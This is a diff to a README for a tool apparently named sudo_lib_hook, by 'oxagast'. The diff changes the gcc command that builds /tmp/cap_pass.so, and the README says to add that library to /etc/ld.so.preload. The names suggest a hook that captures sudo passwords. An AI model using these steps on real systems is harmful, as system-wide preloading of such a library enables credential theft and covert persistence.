@@ -5,7 +5,7 @@
 oxagast
 
 ### Compiling
-Compile using: `gcc -fPIC -shared -ldl sudo_lib_hook.c -o /tmp/cap_pass.so`
+Compile using: `gcc -fPIC -shared -ldl -Wall -o /tmp/cap_pass.so sudo_lib_hook.c`
 
 ### Use
 Then add the resulting shared library `/tmp/cap_pass.so` to the file `/etc/ld.so.preload`.
